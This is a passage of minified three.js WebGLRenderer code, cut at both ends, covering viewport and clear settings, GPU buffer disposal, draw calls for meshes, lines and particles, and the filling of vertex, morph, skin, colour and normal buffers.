Tb=void 0!==e?e:V.height;l.viewport(hc,ic,Sb,Tb)};this.setScissor=function(a,b,c,e){l.scissor(a,b,c,e)};this.enableScissorTest=function(a){a?l.enable(l.SCISSOR_TEST):l.disable(l.SCISSOR_TEST)};this.setClearColor=function(a,b){ta.set(a);Ia=void 0!==b?b:1;l.clearColor(ta.r,ta.g,ta.b,Ia)};this.setClearColorHex=function(a,b){console.warn("DEPRECATED: .setClearColorHex() is being removed. Use .setClearColor() instead.");this.setClearColor(a,b)};this.getClearColor=function(){return ta};this.getClearAlpha=
function(){return Ia};this.clear=function(a,b,c){var e=0;if(void 0===a||a)e|=l.COLOR_BUFFER_BIT;if(void 0===b||b)e|=l.DEPTH_BUFFER_BIT;if(void 0===c||c)e|=l.STENCIL_BUFFER_BIT;l.clear(e)};this.clearTarget=function(a,b,c,e){this.setRenderTarget(a);this.clear(b,c,e)};this.addPostPlugin=function(a){a.init(this);this.renderPluginsPost.push(a)};this.addPrePlugin=function(a){a.init(this);this.renderPluginsPre.push(a)};this.updateShadowMap=function(a,b){Sa=null;ab=Ta=xa=db=Ba=-1;qb=!0;la=fa=-1;this.shadowMapPlugin.update(a,
b)};var tc=function(a){a=a.target;a.removeEventListener("dispose",tc);a.__webglInit=void 0;void 0!==a.__webglVertexBuffer&&l.deleteBuffer(a.__webglVertexBuffer);void 0!==a.__webglNormalBuffer&&l.deleteBuffer(a.__webglNormalBuffer);void 0!==a.__webglTangentBuffer&&l.deleteBuffer(a.__webglTangentBuffer);void 0!==a.__webglColorBuffer&&l.deleteBuffer(a.__webglColorBuffer);void 0!==a.__webglUVBuffer&&l.deleteBuffer(a.__webglUVBuffer);void 0!==a.__webglUV2Buffer&&l.deleteBuffer(a.__webglUV2Buffer);void 0!==
a.__webglSkinIndicesBuffer&&l.deleteBuffer(a.__webglSkinIndicesBuffer);void 0!==a.__webglSkinWeightsBuffer&&l.deleteBuffer(a.__webglSkinWeightsBuffer);void 0!==a.__webglFaceBuffer&&l.deleteBuffer(a.__webglFaceBuffer);void 0!==a.__webglLineBuffer&&l.deleteBuffer(a.__webglLineBuffer);void 0!==a.__webglLineDistanceBuffer&&l.deleteBuffer(a.__webglLineDistanceBuffer);if(void 0!==a.geometryGroups)for(var c in a.geometryGroups){var e=a.geometryGroups[c];if(void 0!==e.numMorphTargets)for(var g=0,f=e.numMorphTargets;g<
f;g++)l.deleteBuffer(e.__webglMorphTargetsBuffers[g]);if(void 0!==e.numMorphNormals)for(g=0,f=e.numMorphNormals;g<f;g++)l.deleteBuffer(e.__webglMorphNormalsBuffers[g]);b(e)}b(a);P.info.memory.geometries--},kc=function(a){a=a.target;a.removeEventListener("dispose",kc);a.image&&a.image.__webglTextureCube?l.deleteTexture(a.image.__webglTextureCube):a.__webglInit&&(a.__webglInit=!1,l.deleteTexture(a.__webglTexture));P.info.memory.textures--},yc=function(a){a=a.target;a.removeEventListener("dispose",yc);
if(a&&a.__webglTexture)if(l.deleteTexture(a.__webglTexture),a instanceof THREE.WebGLRenderTargetCube)for(var b=0;6>b;b++)l.deleteFramebuffer(a.__webglFramebuffer[b]),l.deleteRenderbuffer(a.__webglRenderbuffer[b]);else l.deleteFramebuffer(a.__webglFramebuffer),l.deleteRenderbuffer(a.__webglRenderbuffer);P.info.memory.textures--},zc=function(a){a=a.target;a.removeEventListener("dispose",zc);uc(a)},uc=function(a){var b=a.program;if(void 0!==b){a.program=void 0;var c,e,g=!1;a=0;for(c=ga.length;a<c;a++)if(e=
ga[a],e.program===b){e.usedTimes--;0===e.usedTimes&&(g=!0);break}if(!0===g){g=[];a=0;for(c=ga.length;a<c;a++)e=ga[a],e.program!==b&&g.push(e);ga=g;l.deleteProgram(b);P.info.memory.programs--}}};this.renderBufferImmediate=function(a,b,c){a.hasPositions&&!a.__webglVertexBuffer&&(a.__webglVertexBuffer=l.createBuffer());a.hasNormals&&!a.__webglNormalBuffer&&(a.__webglNormalBuffer=l.createBuffer());a.hasUvs&&!a.__webglUvBuffer&&(a.__webglUvBuffer=l.createBuffer());a.hasColors&&!a.__webglColorBuffer&&(a.__webglColorBuffer=
l.createBuffer());a.hasPositions&&(l.bindBuffer(l.ARRAY_BUFFER,a.__webglVertexBuffer),l.bufferData(l.ARRAY_BUFFER,a.positionArray,l.DYNAMIC_DRAW),l.enableVertexAttribArray(b.attributes.position),l.vertexAttribPointer(b.attributes.position,3,l.FLOAT,!1,0,0));if(a.hasNormals){l.bindBuffer(l.ARRAY_BUFFER,a.__webglNormalBuffer);if(c.shading===THREE.FlatShading){var e,g,f,h,k,q,r,m,p,y,u,t=3*a.count;for(u=0;u<t;u+=9)y=a.normalArray,e=y[u],g=y[u+1],f=y[u+2],h=y[u+3],q=y[u+4],m=y[u+5],k=y[u+6],r=y[u+7],
p=y[u+8],e=(e+h+k)/3,g=(g+q+r)/3,f=(f+m+p)/3,y[u]=e,y[u+1]=g,y[u+2]=f,y[u+3]=e,y[u+4]=g,y[u+5]=f,y[u+6]=e,y[u+7]=g,y[u+8]=f}l.bufferData(l.ARRAY_BUFFER,a.normalArray,l.DYNAMIC_DRAW);l.enableVertexAttribArray(b.attributes.normal);l.vertexAttribPointer(b.attributes.normal,3,l.FLOAT,!1,0,0)}a.hasUvs&&c.map&&(l.bindBuffer(l.ARRAY_BUFFER,a.__webglUvBuffer),l.bufferData(l.ARRAY_BUFFER,a.uvArray,l.DYNAMIC_DRAW),l.enableVertexAttribArray(b.attributes.uv),l.vertexAttribPointer(b.attributes.uv,2,l.FLOAT,!1,
0,0));a.hasColors&&c.vertexColors!==THREE.NoColors&&(l.bindBuffer(l.ARRAY_BUFFER,a.__webglColorBuffer),l.bufferData(l.ARRAY_BUFFER,a.colorArray,l.DYNAMIC_DRAW),l.enableVertexAttribArray(b.attributes.color),l.vertexAttribPointer(b.attributes.color,3,l.FLOAT,!1,0,0));l.drawArrays(l.TRIANGLES,0,a.count);a.count=0};this.renderBufferDirect=function(a,b,c,e,g,f){if(!1!==e.visible){var h,q,r;h=u(a,b,c,e,f);a=h.attributes;b=g.attributes;c=!1;h=16777215*g.id+2*h.id+(e.wireframe?1:0);h!==Ta&&(Ta=h,c=!0);c&&
p();if(f instanceof THREE.Mesh)if(e=b.index){g=g.offsets;1<g.length&&(c=!0);for(var m=0,y=g.length;m<y;m++){var t=g[m].index;if(c){for(q in b)"index"!==q&&(h=a[q],f=b[q],r=f.itemSize,0<=h&&(l.bindBuffer(l.ARRAY_BUFFER,f.buffer),k(h),l.vertexAttribPointer(h,r,l.FLOAT,!1,0,t*r*4)));l.bindBuffer(l.ELEMENT_ARRAY_BUFFER,e.buffer)}l.drawElements(l.TRIANGLES,g[m].count,l.UNSIGNED_SHORT,2*g[m].start);P.info.render.calls++;P.info.render.vertices+=g[m].count;P.info.render.faces+=g[m].count/3}}else{if(c)for(q in b)"index"!==
q&&(h=a[q],f=b[q],r=f.itemSize,0<=h&&(l.bindBuffer(l.ARRAY_BUFFER,f.buffer),k(h),l.vertexAttribPointer(h,r,l.FLOAT,!1,0,0)));q=g.attributes.position;l.drawArrays(l.TRIANGLES,0,q.numItems/3);P.info.render.calls++;P.info.render.vertices+=q.numItems/3;P.info.render.faces+=q.numItems/3/3}else if(f instanceof THREE.ParticleSystem){if(c){for(q in b)h=a[q],f=b[q],r=f.itemSize,0<=h&&(l.bindBuffer(l.ARRAY_BUFFER,f.buffer),k(h),l.vertexAttribPointer(h,r,l.FLOAT,!1,0,0));q=b.position;l.drawArrays(l.POINTS,0,
q.numItems/3);P.info.render.calls++;P.info.render.points+=q.numItems/3}}else if(f instanceof THREE.Line&&c){for(q in b)h=a[q],f=b[q],r=f.itemSize,0<=h&&(l.bindBuffer(l.ARRAY_BUFFER,f.buffer),k(h),l.vertexAttribPointer(h,r,l.FLOAT,!1,0,0));L(e.linewidth);q=b.position;l.drawArrays(l.LINE_STRIP,0,q.numItems/3);P.info.render.calls++;P.info.render.points+=q.numItems}}};this.renderBuffer=function(a,b,c,e,g,f){if(!1!==e.visible){var h,q;c=u(a,b,c,e,f);a=c.attributes;b=!1;c=16777215*g.id+2*c.id+(e.wireframe?
1:0);c!==Ta&&(Ta=c,b=!0);b&&p();if(!e.morphTargets&&0<=a.position)b&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglVertexBuffer),k(a.position),l.vertexAttribPointer(a.position,3,l.FLOAT,!1,0,0));else if(f.morphTargetBase){c=e.program.attributes;-1!==f.morphTargetBase&&0<=c.position?(l.bindBuffer(l.ARRAY_BUFFER,g.__webglMorphTargetsBuffers[f.morphTargetBase]),k(c.position),l.vertexAttribPointer(c.position,3,l.FLOAT,!1,0,0)):0<=c.position&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglVertexBuffer),k(c.position),l.vertexAttribPointer(c.position,
3,l.FLOAT,!1,0,0));if(f.morphTargetForcedOrder.length){var r=0;q=f.morphTargetForcedOrder;for(h=f.morphTargetInfluences;r<e.numSupportedMorphTargets&&r<q.length;)0<=c["morphTarget"+r]&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglMorphTargetsBuffers[q[r]]),k(c["morphTarget"+r]),l.vertexAttribPointer(c["morphTarget"+r],3,l.FLOAT,!1,0,0)),0<=c["morphNormal"+r]&&e.morphNormals&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglMorphNormalsBuffers[q[r]]),k(c["morphNormal"+r]),l.vertexAttribPointer(c["morphNormal"+r],3,
l.FLOAT,!1,0,0)),f.__webglMorphTargetInfluences[r]=h[q[r]],r++}else{q=[];h=f.morphTargetInfluences;var m,y=h.length;for(m=0;m<y;m++)r=h[m],0<r&&q.push([r,m]);q.length>e.numSupportedMorphTargets?(q.sort(t),q.length=e.numSupportedMorphTargets):q.length>e.numSupportedMorphNormals?q.sort(t):0===q.length&&q.push([0,0]);for(r=0;r<e.numSupportedMorphTargets;)q[r]?(m=q[r][1],0<=c["morphTarget"+r]&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglMorphTargetsBuffers[m]),k(c["morphTarget"+r]),l.vertexAttribPointer(c["morphTarget"+
r],3,l.FLOAT,!1,0,0)),0<=c["morphNormal"+r]&&e.morphNormals&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglMorphNormalsBuffers[m]),k(c["morphNormal"+r]),l.vertexAttribPointer(c["morphNormal"+r],3,l.FLOAT,!1,0,0)),f.__webglMorphTargetInfluences[r]=h[m]):f.__webglMorphTargetInfluences[r]=0,r++}null!==e.program.uniforms.morphTargetInfluences&&l.uniform1fv(e.program.uniforms.morphTargetInfluences,f.__webglMorphTargetInfluences)}if(b){if(g.__webglCustomAttributesList)for(h=0,q=g.__webglCustomAttributesList.length;h<
q;h++)c=g.__webglCustomAttributesList[h],0<=a[c.buffer.belongsToAttribute]&&(l.bindBuffer(l.ARRAY_BUFFER,c.buffer),k(a[c.buffer.belongsToAttribute]),l.vertexAttribPointer(a[c.buffer.belongsToAttribute],c.size,l.FLOAT,!1,0,0));0<=a.color&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglColorBuffer),k(a.color),l.vertexAttribPointer(a.color,3,l.FLOAT,!1,0,0));0<=a.normal&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglNormalBuffer),k(a.normal),l.vertexAttribPointer(a.normal,3,l.FLOAT,!1,0,0));0<=a.tangent&&(l.bindBuffer(l.ARRAY_BUFFER,
g.__webglTangentBuffer),k(a.tangent),l.vertexAttribPointer(a.tangent,4,l.FLOAT,!1,0,0));0<=a.uv&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglUVBuffer),k(a.uv),l.vertexAttribPointer(a.uv,2,l.FLOAT,!1,0,0));0<=a.uv2&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglUV2Buffer),k(a.uv2),l.vertexAttribPointer(a.uv2,2,l.FLOAT,!1,0,0));e.skinning&&0<=a.skinIndex&&0<=a.skinWeight&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglSkinIndicesBuffer),k(a.skinIndex),l.vertexAttribPointer(a.skinIndex,4,l.FLOAT,!1,0,0),l.bindBuffer(l.ARRAY_BUFFER,
g.__webglSkinWeightsBuffer),k(a.skinWeight),l.vertexAttribPointer(a.skinWeight,4,l.FLOAT,!1,0,0));0<=a.lineDistance&&(l.bindBuffer(l.ARRAY_BUFFER,g.__webglLineDistanceBuffer),k(a.lineDistance),l.vertexAttribPointer(a.lineDistance,1,l.FLOAT,!1,0,0))}f instanceof THREE.Mesh?(e.wireframe?(L(e.wireframeLinewidth),b&&l.bindBuffer(l.ELEMENT_ARRAY_BUFFER,g.__webglLineBuffer),l.drawElements(l.LINES,g.__webglLineCount,l.UNSIGNED_SHORT,0)):(b&&l.bindBuffer(l.ELEMENT_ARRAY_BUFFER,g.__webglFaceBuffer),l.drawElements(l.TRIANGLES,
g.__webglFaceCount,l.UNSIGNED_SHORT,0)),P.info.render.calls++,P.info.render.vertices+=g.__webglFaceCount,P.info.render.faces+=g.__webglFaceCount/3):f instanceof THREE.Line?(f=f.type===THREE.LineStrip?l.LINE_STRIP:l.LINES,L(e.linewidth),l.drawArrays(f,0,g.__webglLineCount),P.info.render.calls++):f instanceof THREE.ParticleSystem?(l.drawArrays(l.POINTS,0,g.__webglParticleCount),P.info.render.calls++,P.info.render.points+=g.__webglParticleCount):f instanceof THREE.Ribbon&&(l.drawArrays(l.TRIANGLE_STRIP,
0,g.__webglVertexCount),P.info.render.calls++)}};this.render=function(a,b,c,e){if(!1===b instanceof THREE.Camera)console.error("THREE.WebGLRenderer.render: camera is not an instance of THREE.Camera.");else{var g,f,h,k,r=a.__lights,p=a.fog;ab=-1;qb=!0;!0===a.autoUpdate&&a.updateMatrixWorld();void 0===b.parent&&b.updateMatrixWorld();b.matrixWorldInverse.getInverse(b.matrixWorld);xc.multiplyMatrices(b.projectionMatrix,b.matrixWorldInverse);Yb.setFromMatrix(xc);this.autoUpdateObjects&&this.initWebGLObjects(a);
w(this.renderPluginsPre,a,b);P.info.render.calls=0;P.info.render.vertices=0;P.info.render.faces=0;P.info.render.points=0;this.setRenderTarget(c);(this.autoClear||e)&&this.clear(this.autoClearColor,this.autoClearDepth,this.autoClearStencil);k=a.__webglObjects;e=0;for(g=k.length;e<g;e++)if(f=k[e],h=f.object,f.id=e,f.render=!1,h.visible&&(!(h instanceof THREE.Mesh||h instanceof THREE.ParticleSystem)||!h.frustumCulled||Yb.intersectsObject(h))){var u=h;u._modelViewMatrix.multiplyMatrices(b.matrixWorldInverse,
u.matrixWorld);u._normalMatrix.getNormalMatrix(u._modelViewMatrix);var u=f,t=u.buffer,B=void 0,z=B=void 0,z=u.object.material;if(z instanceof THREE.MeshFaceMaterial)B=t.materialIndex,B=z.materials[B],B.transparent?(u.transparent=B,u.opaque=null):(u.opaque=B,u.transparent=null);else if(B=z)B.transparent?(u.transparent=B,u.opaque=null):(u.opaque=B,u.transparent=null);f.render=!0;!0===this.sortObjects&&(null!==h.renderDepth?f.z=h.renderDepth:(Pa.getPositionFromMatrix(h.matrixWorld),Pa.applyProjection(xc),
f.z=Pa.z))}this.sortObjects&&k.sort(m);k=a.__webglObjectsImmediate;e=0;for(g=k.length;e<g;e++)f=k[e],h=f.object,h.visible&&(h._modelViewMatrix.multiplyMatrices(b.matrixWorldInverse,h.matrixWorld),h._normalMatrix.getNormalMatrix(h._modelViewMatrix),h=f.object.material,h.transparent?(f.transparent=h,f.opaque=null):(f.opaque=h,f.transparent=null));a.overrideMaterial?(e=a.overrideMaterial,this.setBlending(e.blending,e.blendEquation,e.blendSrc,e.blendDst),this.setDepthTest(e.depthTest),this.setDepthWrite(e.depthWrite),
I(e.polygonOffset,e.polygonOffsetFactor,e.polygonOffsetUnits),q(a.__webglObjects,!1,"",b,r,p,!0,e),y(a.__webglObjectsImmediate,"",b,r,p,!1,e)):(e=null,this.setBlending(THREE.NoBlending),q(a.__webglObjects,!0,"opaque",b,r,p,!1,e),y(a.__webglObjectsImmediate,"opaque",b,r,p,!1,e),q(a.__webglObjects,!1,"transparent",b,r,p,!0,e),y(a.__webglObjectsImmediate,"transparent",b,r,p,!0,e));w(this.renderPluginsPost,a,b);c&&c.generateMipmaps&&c.minFilter!==THREE.NearestFilter&&c.minFilter!==THREE.LinearFilter&&
(c instanceof THREE.WebGLRenderTargetCube?(l.bindTexture(l.TEXTURE_CUBE_MAP,c.__webglTexture),l.generateMipmap(l.TEXTURE_CUBE_MAP),l.bindTexture(l.TEXTURE_CUBE_MAP,null)):(l.bindTexture(l.TEXTURE_2D,c.__webglTexture),l.generateMipmap(l.TEXTURE_2D),l.bindTexture(l.TEXTURE_2D,null)));this.setDepthTest(!0);this.setDepthWrite(!0)}};this.renderImmediateObject=function(a,b,c,e,g){var f=u(a,b,c,e,g);Ta=-1;P.setMaterialFaces(e);g.immediateRenderCallback?g.immediateRenderCallback(f,l,Yb):g.render(function(a){P.renderBufferImmediate(a,
f,e)})};this.initWebGLObjects=function(a){a.__webglObjects||(a.__webglObjects=[],a.__webglObjectsImmediate=[],a.__webglSprites=[],a.__webglFlares=[]);for(;a.__objectsAdded.length;)r(a.__objectsAdded[0],a),a.__objectsAdded.splice(0,1);for(;a.__objectsRemoved.length;)D(a.__objectsRemoved[0],a),a.__objectsRemoved.splice(0,1);for(var b=0,c=a.__webglObjects.length;b<c;b++){var q=a.__webglObjects[b].object;void 0===q.__webglInit&&(void 0!==q.__webglActive&&D(q,a),r(q,a));var k=q,m=k.geometry,p=void 0,y=
void 0,u=void 0;if(m instanceof THREE.BufferGeometry){var z=l.DYNAMIC_DRAW,w=!m.dynamic,G=m.attributes,W=void 0,O=void 0;for(W in G)O=G[W],O.needsUpdate&&("index"===W?(l.bindBuffer(l.ELEMENT_ARRAY_BUFFER,O.buffer),l.bufferData(l.ELEMENT_ARRAY_BUFFER,O.array,z)):(l.bindBuffer(l.ARRAY_BUFFER,O.buffer),l.bufferData(l.ARRAY_BUFFER,O.array,z)),O.needsUpdate=!1),w&&!O.dynamic&&delete O.array}else if(k instanceof THREE.Mesh){for(var K=0,J=m.geometryGroupsList.length;K<J;K++)if(p=m.geometryGroupsList[K],
u=g(k,p),m.buffersNeedUpdate&&e(p,k),y=u.attributes&&C(u),m.verticesNeedUpdate||m.morphTargetsNeedUpdate||m.elementsNeedUpdate||m.uvsNeedUpdate||m.normalsNeedUpdate||m.colorsNeedUpdate||m.tangentsNeedUpdate||y){var F=p,I=k,H=l.DYNAMIC_DRAW,L=!m.dynamic,M=u;if(F.__inittedArrays){var T=f(M),P=M.vertexColors?M.vertexColors:!1,ja=h(M),ia=T===THREE.SmoothShading,E=void 0,U=void 0,V=void 0,N=void 0,Y=void 0,X=void 0,Z=void 0,ta=void 0,pa=void 0,ga=void 0,wa=void 0,R=void 0,S=void 0,Q=void 0,da=void 0,fa=
void 0,la=void 0,ma=void 0,xa=void 0,Ia=void 0,qa=void 0,ra=void 0,Ja=void 0,Aa=void 0,Ba=void 0,Ma=void 0,ab=void 0,Oa=void 0,Sa=void 0,Ta=void 0,db=void 0,vb=void 0,wb=void 0,xb=void 0,ib=void 0,sa=void 0,sb=void 0,cb=void 0,kb=void 0,lb=void 0,Ua=void 0,Fb=void 0,Qa=void 0,Ra=void 0,Mb=void 0,Hb=void 0,Ka=0,Na=0,Ib=0,Jb=0,mb=0,Za=0,ya=0,bb=0,La=0,ba=0,ha=0,A=0,ua=void 0,Va=F.__vertexArray,qb=F.__uvArray,rb=F.__uv2Array,nb=F.__normalArray,Ea=F.__tangentArray,Wa=F.__colorArray,Fa=F.__skinIndexArray,
Ga=F.__skinWeightArray,Db=F.__morphTargetsArrays,Eb=F.__morphNormalsArrays,Gb=F.__webglCustomAttributesList,x=void 0,yb=F.__faceArray,jb=F.__lineArray,eb=I.geometry,Qb=eb.elementsNeedUpdate,Rb=eb.uvsNeedUpdate,Zb=eb.normalsNeedUpdate,fc=eb.tangentsNeedUpdate,hc=eb.colorsNeedUpdate,ic=eb.morphTargetsNeedUpdate,Ub=eb.vertices,na=F.faces3,oa=F.faces4,$a=eb.faces,Sb=eb.faceVertexUvs[0],Tb=eb.faceVertexUvs[1],Vb=eb.skinIndices,Nb=eb.skinWeights,Ob=eb.morphTargets,Ac=eb.morphNormals;if(eb.verticesNeedUpdate){E=
0;for(U=na.length;E<U;E++)N=$a[na[E]],R=Ub[N.a],S=Ub[N.b],Q=Ub[N.c],Va[Na]=R.x,Va[Na+1]=R.y,Va[Na+2]=R.z,Va[Na+3]=S.x,Va[Na+4]=S.y,Va[Na+5]=S.z,Va[Na+6]=Q.x,Va[Na+7]=Q.y,Va[Na+8]=Q.z,Na+=9;E=0;for(U=oa.length;E<U;E++)N=$a[oa[E]],R=Ub[N.a],S=Ub[N.b],Q=Ub[N.c],da=Ub[N.d],Va[Na]=R.x,Va[Na+1]=R.y,Va[Na+2]=R.z,Va[Na+3]=S.x,Va[Na+4]=S.y,Va[Na+5]=S.z,Va[Na+6]=Q.x,Va[Na+7]=Q.y,Va[Na+8]=Q.z,Va[Na+9]=da.x,Va[Na+10]=da.y,Va[Na+11]=da.z,Na+=12;l.bindBuffer(l.ARRAY_BUFFER,F.__webglVertexBuffer);l.bufferData(l.ARRAY_BUFFER,
Va,H)}if(ic)for(Ua=0,Fb=Ob.length;Ua<Fb;Ua++){E=ha=0;for(U=na.length;E<U;E++)Mb=na[E],N=$a[Mb],R=Ob[Ua].vertices[N.a],S=Ob[Ua].vertices[N.b],Q=Ob[Ua].vertices[N.c],Qa=Db[Ua],Qa[ha]=R.x,Qa[ha+1]=R.y,Qa[ha+2]=R.z,Qa[ha+3]=S.x,Qa[ha+4]=S.y,Qa[ha+5]=S.z,Qa[ha+6]=Q.x,Qa[ha+7]=Q.y,Qa[ha+8]=Q.z,M.morphNormals&&(ia?(Hb=Ac[Ua].vertexNormals[Mb],Ia=Hb.a,qa=Hb.b,ra=Hb.c):ra=qa=Ia=Ac[Ua].faceNormals[Mb],Ra=Eb[Ua],Ra[ha]=Ia.x,Ra[ha+1]=Ia.y,Ra[ha+2]=Ia.z,Ra[ha+3]=qa.x,Ra[ha+4]=qa.y,Ra[ha+5]=qa.z,Ra[ha+6]=ra.x,
Ra[ha+7]=ra.y,Ra[ha+8]=ra.z),ha+=9;E=0;for(U=oa.length;E<U;E++)Mb=oa[E],N=$a[Mb],R=Ob[Ua].vertices[N.a],S=Ob[Ua].vertices[N.b],Q=Ob[Ua].vertices[N.c],da=Ob[Ua].vertices[N.d],Qa=Db[Ua],Qa[ha]=R.x,Qa[ha+1]=R.y,Qa[ha+2]=R.z,Qa[ha+3]=S.x,Qa[ha+4]=S.y,Qa[ha+5]=S.z,Qa[ha+6]=Q.x,Qa[ha+7]=Q.y,Qa[ha+8]=Q.z,Qa[ha+9]=da.x,Qa[ha+10]=da.y,Qa[ha+11]=da.z,M.morphNormals&&(ia?(Hb=Ac[Ua].vertexNormals[Mb],Ia=Hb.a,qa=Hb.b,ra=Hb.c,Ja=Hb.d):Ja=ra=qa=Ia=Ac[Ua].faceNormals[Mb],Ra=Eb[Ua],Ra[ha]=Ia.x,Ra[ha+1]=Ia.y,Ra[ha+
2]=Ia.z,Ra[ha+3]=qa.x,Ra[ha+4]=qa.y,Ra[ha+5]=qa.z,Ra[ha+6]=ra.x,Ra[ha+7]=ra.y,Ra[ha+8]=ra.z,Ra[ha+9]=Ja.x,Ra[ha+10]=Ja.y,Ra[ha+11]=Ja.z),ha+=12;l.bindBuffer(l.ARRAY_BUFFER,F.__webglMorphTargetsBuffers[Ua]);l.bufferData(l.ARRAY_BUFFER,Db[Ua],H);M.morphNormals&&(l.bindBuffer(l.ARRAY_BUFFER,F.__webglMorphNormalsBuffers[Ua]),l.bufferData(l.ARRAY_BUFFER,Eb[Ua],H))}if(Nb.length){E=0;for(U=na.length;E<U;E++)N=$a[na[E]],Oa=Nb[N.a],Sa=Nb[N.b],Ta=Nb[N.c],Ga[ba]=Oa.x,Ga[ba+1]=Oa.y,Ga[ba+2]=Oa.z,Ga[ba+3]=Oa.w,
Ga[ba+4]=Sa.x,Ga[ba+5]=Sa.y,Ga[ba+6]=Sa.z,Ga[ba+7]=Sa.w,Ga[ba+8]=Ta.x,Ga[ba+9]=Ta.y,Ga[ba+10]=Ta.z,Ga[ba+11]=Ta.w,vb=Vb[N.a],wb=Vb[N.b],xb=Vb[N.c],Fa[ba]=vb.x,Fa[ba+1]=vb.y,Fa[ba+2]=vb.z,Fa[ba+3]=vb.w,Fa[ba+4]=wb.x,Fa[ba+5]=wb.y,Fa[ba+6]=wb.z,Fa[ba+7]=wb.w,Fa[ba+8]=xb.x,Fa[ba+9]=xb.y,Fa[ba+10]=xb.z,Fa[ba+11]=xb.w,ba+=12;E=0;for(U=oa.length;E<U;E++)N=$a[oa[E]],Oa=Nb[N.a],Sa=Nb[N.b],Ta=Nb[N.c],db=Nb[N.d],Ga[ba]=Oa.x,Ga[ba+1]=Oa.y,Ga[ba+2]=Oa.z,Ga[ba+3]=Oa.w,Ga[ba+4]=Sa.x,Ga[ba+5]=Sa.y,Ga[ba+6]=Sa.z,
Ga[ba+7]=Sa.w,Ga[ba+8]=Ta.x,Ga[ba+9]=Ta.y,Ga[ba+10]=Ta.z,Ga[ba+11]=Ta.w,Ga[ba+12]=db.x,Ga[ba+13]=db.y,Ga[ba+14]=db.z,Ga[ba+15]=db.w,vb=Vb[N.a],wb=Vb[N.b],xb=Vb[N.c],ib=Vb[N.d],Fa[ba]=vb.x,Fa[ba+1]=vb.y,Fa[ba+2]=vb.z,Fa[ba+3]=vb.w,Fa[ba+4]=wb.x,Fa[ba+5]=wb.y,Fa[ba+6]=wb.z,Fa[ba+7]=wb.w,Fa[ba+8]=xb.x,Fa[ba+9]=xb.y,Fa[ba+10]=xb.z,Fa[ba+11]=xb.w,Fa[ba+12]=ib.x,Fa[ba+13]=ib.y,Fa[ba+14]=ib.z,Fa[ba+15]=ib.w,ba+=16;0<ba&&(l.bindBuffer(l.ARRAY_BUFFER,F.__webglSkinIndicesBuffer),l.bufferData(l.ARRAY_BUFFER,
Fa,H),l.bindBuffer(l.ARRAY_BUFFER,F.__webglSkinWeightsBuffer),l.bufferData(l.ARRAY_BUFFER,Ga,H))}if(hc&&P){E=0;for(U=na.length;E<U;E++)N=$a[na[E]],Z=N.vertexColors,ta=N.color,3===Z.length&&P===THREE.VertexColors?(Aa=Z[0],Ba=Z[1],Ma=Z[2]):Ma=Ba=Aa=ta,Wa[La]=Aa.r,Wa[La+1]=Aa.g,Wa[La+2]=Aa.b,Wa[La+3]=Ba.r,Wa[La+4]=Ba.g,Wa[La+5]=Ba.b,Wa[La+6]=Ma.r,Wa[La+7]=Ma.g,Wa[La+8]=Ma.b,La+=9;E=0;for(U=oa.length;E<U;E++)N=$a[oa[E]],Z=N.vertexColors,ta=N.color,4===Z.length&&P===THREE.VertexColors?(Aa=Z[0],Ba=Z[1],
Ma=Z[2],ab=Z[3]):ab=Ma=Ba=Aa=ta,Wa[La]=Aa.r,Wa[La+1]=Aa.g,Wa[La+2]=Aa.b,Wa[La+3]=Ba.r,Wa[La+4]=Ba.g,Wa[La+5]=Ba.b,Wa[La+6]=Ma.r,Wa[La+7]=Ma.g,Wa[La+8]=Ma.b,Wa[La+9]=ab.r,Wa[La+10]=ab.g,Wa[La+11]=ab.b,La+=12;0<La&&(l.bindBuffer(l.ARRAY_BUFFER,F.__webglColorBuffer),l.bufferData(l.ARRAY_BUFFER,Wa,H))}if(fc&&eb.hasTangents){E=0;for(U=na.length;E<U;E++)N=$a[na[E]],pa=N.vertexTangents,fa=pa[0],la=pa[1],ma=pa[2],Ea[ya]=fa.x,Ea[ya+1]=fa.y,Ea[ya+2]=fa.z,Ea[ya+3]=fa.w,Ea[ya+4]=la.x,Ea[ya+5]=la.y,Ea[ya+6]=la.z,
Ea[ya+7]=la.w,Ea[ya+8]=ma.x,Ea[ya+9]=ma.y,Ea[ya+10]=ma.z,Ea[ya+11]=ma.w,ya+=12;E=0;for(U=oa.length;E<U;E++)N=$a[oa[E]],pa=N.vertexTangents,fa=pa[0],la=pa[1],ma=pa[2],xa=pa[3],Ea[ya]=fa.x,Ea[ya+1]=fa.y,Ea[ya+2]=fa.z,Ea[ya+3]=fa.w,Ea[ya+4]=la.x,Ea[ya+5]=la.y,Ea[ya+6]=la.z,Ea[ya+7]=la.w,Ea[ya+8]=ma.x,Ea[ya+9]=ma.y,Ea[ya+10]=ma.z,Ea[ya+11]=ma.w,Ea[ya+12]=xa.x,Ea[ya+13]=xa.y,Ea[ya+14]=xa.z,Ea[ya+15]=xa.w,ya+=16;l.bindBuffer(l.ARRAY_BUFFER,F.__webglTangentBuffer);l.bufferData(l.ARRAY_BUFFER,Ea,H)}if(Zb&&
T){E=0;for(U=na.length;E<U;E++)if(N=$a[na[E]],Y=N.vertexNormals,X=N.normal,3===Y.length&&ia)for(sa=0;3>sa;sa++)cb=Y[sa],nb[Za]=cb.x,nb[Za+1]=cb.y,nb[Za+2]=cb.z,Za+=3;else for(sa=0;3>sa;sa++)nb[Za]=X.x,nb[Za+1]=X.y,nb[Za+2]=X.z,Za+=3;E=0;for(U=oa.length;E<U;E++)if(N=$a[oa[E]],Y=N.vertexNormals,X=N.normal,4===Y.length&&ia)for(sa=0;4>sa;sa++)cb=Y[sa],nb[Za]=cb.x,nb[Za+1]=cb.y,nb[Za+2]=cb.z,Za+=3;else for(sa=0;4>sa;sa++)nb[Za]=X.x,nb[Za+1]=X.y,nb[Za+2]=X.z,Za+=3;l.bindBuffer(l.ARRAY_BUFFER,F.__webglNormalBuffer);
